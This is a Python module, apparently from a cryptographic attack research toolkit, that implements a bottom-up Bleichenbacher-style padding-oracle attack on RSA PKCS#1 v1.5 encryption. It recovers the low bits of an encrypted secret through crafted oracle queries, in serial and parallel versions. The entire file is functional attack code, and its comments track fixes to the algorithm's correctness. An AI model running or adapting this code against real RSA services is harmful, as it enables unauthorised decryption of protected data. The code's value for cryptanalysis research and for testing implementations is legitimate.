from typing import Tuple, Optional
import gmpy2
import legacy_attack.utils as utils

# === helper methods ===

def _try_s_values_parallel(r: int, divisor: int, candidates: list, lcm: int, oracle, D_min: int, D_max: int, e_lower: int, e_upper: int, N: int) -> Optional[int]:
    e_center = (e_upper + e_lower) // 2
    
    # make it faster
    n = gmpy2.mpz(N)
    divisor = gmpy2.mpz(divisor)
    r = gmpy2.mpz(r)
    D_min = gmpy2.mpz(D_min)
    D_max = gmpy2.mpz(D_max)
    lcm = gmpy2.mpz(lcm)
    
    r_one = utils.mod_div(gmpy2.mpz(1), divisor, n) * divisor // n
    
    offsets = list(range(e_upper - e_lower + 1))
    while offsets:
        args = list()
        for offset in offsets[:2]:  # modular arith in here is slow, so we do one a few offsets at a time
            # Compute base Bleichenbacher shift from offset (alternate up/down from center)
            if offset % 2 == 0:
                e_base = e_center - offset // 2
            else:
                e_base = e_center + (offset + 1) // 2
            
            for candidate_value in candidates:
                # Compute the actual s value to test
                k_ring = utils.mod_div(r, r_one * candidate_value, divisor)
                s_test = e_base * divisor + k_ring
                coverage = utils.get_scaled_coverage(s_test, D_min, D_max)
                new_a, new_b = [x * lcm for x in coverage]
                args.append((utils.mod_div(-s_test, divisor * lcm, n), (candidate_value, new_a, new_b)))
        
        offsets = offsets[2:]
        work_queue = oracle.submit(args)
        for res, c in oracle.as_completed(work_queue):
            if not c:
                continue
            oracle.cancel(work_queue)
            return res
    return None

def _try_s_values(r: int, divisor: int, candidates: list, lcm: int, oracle, D_min: int, D_max: int, e_lower: int, e_upper: int, N: int) -> Optional[int]:
    e_center = (e_upper + e_lower) // 2
    
    r_one = utils.mod_div(1, divisor, N) * divisor // N

    for offset in range(e_upper - e_lower + 1):
        if offset % 2 == 0:
            e_base = e_center - offset // 2
        else:
            e_base = e_center + (offset + 1) // 2
        
        for candidate_value in candidates:
            # Compute the actual s value to test
            if r_one * candidate_value % divisor == 0:
                # This should not really happen but just to be sure
                continue
                
            k_ring = utils.mod_div(r, r_one * candidate_value, divisor)
            s_test = e_base * divisor + k_ring
            coverage = utils.get_scaled_coverage(s_test, D_min, D_max)
            new_a, new_b = [x * lcm for x in coverage]
            if oracle.query(utils.mod_div(-s_test, divisor * lcm, N)):
                return candidate_value, new_a, new_b
    return None

def _certified_offsets(D, candidate_count, a, b, B, N):
    """Return one proved (odd r, delta) for a canonical odd binary batch."""
    # Issues 1/5: D and the batch size are powers of two, with at least
    # one known parity bit. Odd N makes D invertible; the callers supply
    # odd candidates spaced by D / candidate_count.
    if (not 0 < a < b or candidate_count < 2
            or candidate_count & (candidate_count - 1)
            or D & (D - 1) or D < 2 * candidate_count or N % 2 == 0):
        return None
    # Issues 2/4/6: check the actual interval and current modulus, rather
    # than rejecting all small trimmers or all batches below three bits.
    # Outside these sufficient conditions the existing heuristic can run.
    if (2 * (D + 2 * b) > B or candidate_count * B > N
            or 2 * N * (b - a) > candidate_count * B * b
            or D * (2 * B + D + 2 * b) > N * (D - 1)):
        return None

    # The proved r interval has length at least 2: its largest odd integer
    # is admissible. Do not merely round the empirical starting r to odd.
    r = D * (N - 2 * B - D - 2 * b) // N
    r -= 1 - r % 2
    lower = max(1, (D * (N - 3 * B) - r * N) // (D * a) + 1)
    upper = (D * (N - 2 * B - D) - r * N) // (D * b) - 1
    return r, (lower + upper) // 2


def _recover_bit_position(bit_position: int, low: int, high: int, lcm: int, candidates: int, B: int, N: int, oracle, try_s):
    """
    Searches for a valid set of oracle query parameters (r, e_base)
    that can distinguish between the two message candidates.

    After trying a certified full-coverage offset when available, the
    fallback iterates through descending odd values of `r` (the
    "congruence parameter"). For each `r`, it calculates the
    heuristic partial-coverage range [e_lower, e_upper] for the "base shift"
    `e_base`.

    It then calls `_try_s_values` to test combinations within this range.
    This two-tiered search (looping `r`, then looping `e_base`)
    provides robustness against unreliable oracles (false negatives).
    """
    divisor = 2 ** bit_position
    a_lcm = utils.ceil_div(low, lcm)
    b_lcm = high // lcm

    # Issue 5: these are the actual denominators used by the oracle query.
    if gmpy2.gcd(divisor * lcm, N) != 1:
        raise ValueError("Bottom-Up requires the divisor and trimmer to be invertible modulo N")
    if not 0 < a_lcm <= b_lcm:
        raise ValueError("Bottom-Up requires a nonempty positive working interval")
    if a_lcm == b_lcm:
        return a_lcm % divisor, a_lcm * lcm, a_lcm * lcm

    # Issues 1-6: a single full-coverage offset needs at most one query per
    # candidate on a perfect oracle. Keep the retry search below if an
    # imperfect oracle rejects the whole batch or the bounds do not hold.
    certified = (_certified_offsets(divisor, len(candidates), a_lcm, b_lcm, B, N)
                 if all(v % 2 for v in candidates) else None)
    if certified is not None:
        r, delta = certified
        D_min = (divisor - r) * N - 3 * B * divisor
        D_max = (divisor - r) * N - 2 * B * divisor
        result = try_s(r, divisor, candidates, lcm, oracle, D_min, D_max, delta, delta, N)
        if result is not None:
            return result

    # Compute initial r value using heuristic
    r_start = divisor - utils.ceil_div(5 * B * divisor, N * 2)
    r_start -= 1 - r_start % 2
    
    # Search for a valid congruence parameter r.
    # This loop also implicitly handles oracle false negatives: if a valid (r, e_base)
    # combination fails due to an oracle error, the loop continues until
    # a working combination is found.
    for r in range(r_start, 0, -2):
        # Issues 3/4: for the guessed residue, s_test*x must lie in
        # ((D-r)*N - 3*B*D, (D-r)*N - 2*B*D]. Scaling before dividing
        # preserves the fractional r*N/D and the oracle's open endpoint.
        base_distance = (divisor - r) * N
        D_min = base_distance - 3 * B * divisor
        D_max = base_distance - 2 * B * divisor

        # This broad range is a heuristic: it permits partial coverage.
        e_lower = D_min // (divisor * b_lcm)
        e_upper = utils.ceil_div(D_max, divisor * a_lcm)

        # Try different s values to find which candidate is correct
        result = try_s(r, divisor, candidates, lcm, oracle, D_min, D_max, e_lower, e_upper, N)
        if result is not None:
            return result
        
    raise Exception("Bottom up failed")


# === methods that should be called ===

def bottom_up_parallel(logger, oracle, rsa, lcm: int, low: int, high: int, config):
    """Recover the least significant nbits of the secret message using bottom-up approach."""
    known = 1  # m mod 2^1 = 1 (enforced during trimming)
    
    B = utils.pkcs_compute_B((rsa.bits + 7) // 8)

    # Issue 1: parity is already known. Stop after ceil((n - 1) / ell)
    # batches; the old upper limit added a batch when n == 1 (mod ell).
    for bit_position in range(config.parallel_bits + 1, config.total_bits + config.parallel_bits, config.parallel_bits):
        divisor = 2 ** bit_position
        candidates = [known + n * (2 ** (bit_position - config.parallel_bits)) for n in range(2 ** config.parallel_bits)]

        step_calls = oracle.calls
        lcm_mod, new_low, new_high = _recover_bit_position(bit_position, low, high, lcm, candidates, B, rsa.N, oracle, _try_s_values_parallel)
        low = max(low, new_low)
        high = min(high, new_high)
        logger.info(f'[BottomUpRecovery] bit_position={bit_position} calls={oracle.calls - step_calls}')
        
        known = lcm_mod
        mod = utils.revert_lcm(lcm_mod, divisor, lcm)
    
    secret = utils.revert_lcm(known, 2**config.total_bits, lcm)
    return secret

def bottom_up(logger, oracle, rsa, lcm: int, low: int, high: int, config):
    known = 1
    B = utils.pkcs_compute_B((rsa.bits + 7) // 8)

    # Issue 1: start with the second bit; querying D=2 repeats known parity.
    for bit_position in range(2, config.total_bits + 1):
        divisor = 2 ** bit_position
        candidates = [known, known + divisor // 2]

        step_calls = oracle.calls
        lcm_mod, new_low, new_high = _recover_bit_position(bit_position, low, high, lcm, candidates, B, rsa.N, oracle, _try_s_values)
        low = max(low, new_low)
        high = min(high, new_high)
        logger.info(f'[BottomUpRecovery] bit_position={bit_position} calls={oracle.calls - step_calls}')
        
        known = lcm_mod
        mod = utils.revert_lcm(lcm_mod, divisor, lcm)
    
    secret = utils.revert_lcm(known, 2**config.total_bits, lcm)
    return secret
    
